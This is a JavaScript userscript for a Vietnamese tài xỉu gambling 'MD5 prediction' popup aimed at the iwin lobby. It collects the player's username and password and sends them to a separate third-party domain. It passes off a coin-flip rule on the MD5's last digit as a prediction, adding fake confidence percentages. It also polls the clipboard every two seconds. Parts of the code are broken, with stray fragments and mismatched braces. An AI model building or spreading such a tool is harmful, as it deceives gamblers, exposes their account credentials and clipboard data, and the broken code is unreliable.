function dragElement(elmnt, handle) {
  let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
  handle.onmousedown = function(e) {
    e.preventDefault();
    pos3 = e.clientX;
    pos4 = e.clientY;
    document.onmouseup = closeDragElement;
    document.onmousemove = elementDrag;
  };
  function elementDrag(e) {
    e.preventDefault();
    pos1 = pos3 - e.clientX;
    pos2 = pos4 - e.clientY;
    pos3 = e.clientX;
    pos4 = e.clientY;
    elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
    elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
    if (elmnt.id === "txmd5-avatar") {
      const percent = document.getElementById("txmd5-percent");
      percent.style.top = elmnt.style.top;
      percent.style.left = elmnt.style.left;
    }
  }
  function closeDragElement() {
    document.onmouseup = null;
    document.onmousemove = null;
  }
}

function showPopup() {
  popup.style.display = "block";
  avatar.style.display = "none";
  percent.style.display = "none";
}

function hidePopup() {
  popup.style.display = "none";
  avatar.style.display = "block";
  avatar.style.top = popup.style.top;
  avatar.style.left = popup.style.left;
  percent.style.display = "block";
  percent.style.top = popup.style.top;
  percent.style.left = popup.style.left;
}

function handleLogin() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const sanh = document.getElementById("sanh").value.trim();
  if (!sanh || sanh !== "iwin") return alert("Vui lòng chọn sảnh iwin trước khi đăng nhập.");
  if (!username || !password) return alert("Vui lòng nhập đủ tài khoản và mật khẩu.");

  fetch("https://getquayaybiai.gwyqinbg.com/user/login.aspx", {
    headers: {
      "accept": "*/*",
      "content-type": "text/plain;charset=UTF-8"
    },
    body: JSON.stringify({
      username: username,
      password: password,
      app_id: "iwin.club",
      os: "Windows",
      device: "Computer",
      browser: "chrome",
      fg: "",
      aff_id: "",
      version: ""
    }),
    method: "POST",
    mode: "cors",
    credentials: "omit"
  })
  .then(res => res.json())
  .then(data => {
    const user = data.data?.[0] || {}
    
document.getElementById("popup-userinfo").innerText =
    `👤 ${user.username || ''} | 💰 ${user.main_balance || 0} | 🏷 ${user.fullname || ''}`;
document.getElementById("username").style.display = "none";
document.getElementById("password").style.display = "none";
document.getElementById("popup-login").style.display = "none";
document.getElementById("md5Input").style.display = "block";
document.getElementById("popup-predict").style.display = "block";

      `👤 ${user.username || ''} | 💰 ${user.main_balance || 0} | 🏷 ${user.fullname || ''}`;
  })
  .catch(err => alert("Đăng nhập thất bại!"));
}


function handlePredict() {
  const md5Input = document.getElementById("md5Input");
  if (md5Input.style.display === "none") {
    alert("Bạn cần đăng nhập trước khi dự đoán.");
    return;
  }

  const md5 = document.getElementById("md5Input").value.trim().toLowerCase();
  if (!/^[a-f0-9]{32}$/.test(md5)) return alert("Mã MD5 không hợp lệ!");
  const resultText = "0123456789abcdef".indexOf(md5[md5.length - 1]) % 2 === 0 ? "XỈU" : "TÀI";
  const percentEl = document.getElementById("txmd5-percent");
  const resultEl = document.getElementById("popup-result");
  resultEl.innerText = "ĐANG DỰ ĐOÁN..."; percentEl.innerText = "";

  setTimeout(() => {
    if (popup.style.display === "none") {
      percentEl.innerText = resultText === "TÀI" ? "🟢 52% TÀI" : "🟢 48% XỈU"; percentEl.style.display = "block";
    } else {
      resultEl.innerText = "Kết quả: " + resultText;
    }
  }, 3000);
}


(function () {
  document.addEventListener("DOMContentLoaded", () => {
  percent.innerText = "🟢 50% TÀI - 50% XỈU";
  percent.style.display = "block";
  percent.style.top = avatar.style.top || "100px";
  percent.style.left = avatar.style.left || "100px";

  const userInfo = document.getElementById("popup-userinfo").innerText;
  if (!userInfo.trim() || userInfo.trim() === "") {
    document.getElementById("md5Input").style.display = "none";
    document.getElementById("popup-predict").style.display = "none";
    document.getElementById("popup-result").innerText = "Vui lòng đăng nhập để bắt đầu.";
  }
});
    const userInfo = document.getElementById("popup-userinfo").innerText;
    
if (!userInfo.trim() || userInfo.trim() === "") {
      document.getElementById("md5Input").style.display = "none";
      document.getElementById("popup-predict").style.display = "none";
      document.getElementById("popup-result").innerText = "Vui lòng đăng nhập để bắt đầu.";

      document.getElementById("md5Input").style.display = "none";
      document.getElementById("popup-predict").style.display = "none";
    }
  });

  const wrapper = document.createElement("div");
  wrapper.innerHTML = `
<div id="txmd5-popup" style="position:fixed; top:100px; left:100px; background:linear-gradient(135deg,#1c1f26,#2e3b4e); color:#ffffff; border-radius:20px; padding:20px; z-index:9999; box-shadow:0 10px 30px rgba(0,0,0,0.5); min-width:300px; font-family:'Segoe UI',sans-serif; resize:both; overflow:auto;">
  <div id="txmd5-header" style="cursor:move; font-weight:bold; font-size:20px; margin-bottom:12px; text-align:center;">🎲 TOOL TXMD5</div>
  <div id="txmd5-body">
    <label for="sanh">Chọn sảnh:</label>
    <select id="sanh" style="width:100%; margin-bottom:12px; background:#2e3b4e; color:#00ffcc; border:none; padding:10px; border-radius:10px;">
      <option value="">-- Chọn sảnh --</option>
      <option value="iwin">Sảnh iwin</option>
    </select>
    <input type="text" id="username" placeholder="Tên đăng nhập" style="width:100%; margin-bottom:10px; background:#2e3b4e; color:#00ffcc; padding:10px; border:none; border-radius:10px;">
    <input type="password" id="password" placeholder="Mật khẩu" style="width:100%; margin-bottom:10px; background:#2e3b4e; color:#00ffcc; padding:10px; border:none; border-radius:10px;">
    <button id="popup-login" style="width:100%; background:#00ffcc; color:#000; font-weight:bold; padding:10px; border-radius:10px;">Đăng nhập</button>
    <div id="popup-userinfo" style="font-size:18px; font-weight:bold; margin-top:12px; text-align:center;"></div>
    <hr style="border:1px solid #00ffcc; margin:15px 0;">
    <input type="text" id="md5Input" placeholder="Nhập mã MD5" style="width:100%; margin-top:10px; background:#2e3b4e; color:#00ffcc; padding:10px; border:none; border-radius:10px;">
    <button id="popup-predict" style="width:100%; background:#00ffcc; color:#000; font-weight:bold; margin-top:10px; padding:10px; border-radius:10px;">Dự đoán</button>
    <div id="popup-result" style="margin-top:12px; font-weight:bold; text-align:center;">Kết quả sẽ hiển thị ở đây...</div>
  </div>
  <div id="txmd5-close" style="position:absolute; top:6px; right:10px; cursor:pointer;">ĐÓNG</div>
</div>
<img id="txmd5-avatar" src="https://i.imgur.com/HMvM2hU.png" style="display:none; position:fixed; width:432px; height:432px; border-radius:50%; cursor:move; z-index:9998;">
<div id="txmd5-percent" style="display:none; position:fixed; z-index:9999; color:#00ffcc; font-size:36px; font-weight:bold; text-shadow:0 0 10px #00ffcc;"></div>
`;
  document.body.appendChild(wrapper);

  window.popup = document.getElementById("txmd5-popup");
  window.avatar = document.getElementById("txmd5-avatar");
  window.percent = document.getElementById("txmd5-percent");

  // dragElement(popup);  // removed to prevent conflict
  dragElement(avatar, avatar);

  dragElement(popup, document.getElementById("txmd5-header"));
  document.getElementById("txmd5-close").onclick = hidePopup;
  avatar.onclick = showPopup;
  document.getElementById("popup-login").onclick = handleLogin;
  document.getElementById("popup-predict").onclick = handlePredict;


// Yêu cầu quyền clipboard và theo dõi MD5 mới được copy
navigator.permissions.query({ name: "clipboard-read" }).then(result => {
  if (result.state === "granted" || result.state === "prompt") {
    navigator.clipboard.readText().then(text => {
      console.log("Quyền clipboard OK. MD5 đầu:", text);
    });
  } else {
    alert("Bạn cần cấp quyền clipboard để tiện ích hoạt động.");
  }
});

let lastClipboard = "";
setInterval(() => {
  navigator.clipboard.readText().then(text => {
    const md5 = text.trim().toLowerCase();
    if (/^[a-f0-9]{32}$/.test(md5) && md5 !== lastClipboard) {
      lastClipboard = md5;
      const resultText = "0123456789abcdef".indexOf(md5[md5.length - 1]) % 2 === 0 ? "XỈU" : "TÀI";
      const percentEl = document.getElementById("txmd5-percent");
      const resultEl = document.getElementById("popup-result");
      resultEl.innerText = "ĐANG DỰ ĐOÁN..."; percentEl.innerText = "";
      setTimeout(() => {
        if (popup.style.display === "none") {
          percentEl.innerText = resultText === "TÀI" ? "🟢 52% TÀI" : "🟢 48% XỈU";
          percentEl.style.display = "block";
        } else {
          resultEl.innerText = "Kết quả: " + resultText;
        }
      }, 3000);
    }
  }).catch(err => console.error("Không thể đọc clipboard:", err));
}, 2000);